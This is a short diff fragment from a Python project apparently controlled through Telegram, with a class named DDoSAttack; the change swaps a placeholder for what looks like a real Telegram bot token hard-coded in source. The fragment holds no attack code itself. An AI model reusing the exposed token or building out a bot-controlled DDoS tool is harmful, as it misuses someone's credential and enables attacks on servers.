@@ -22,7 +22,7 @@ class DDoSAttack:
         self.port = new_port
 
 def telegram_bot_start():
-    bot_api_key = "gjjjjjjj"
+    bot_api_key = "8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko"
     bot_url = f"https://api.telegram.org/bot{bot_api_key}/"
 
     # Handle commands
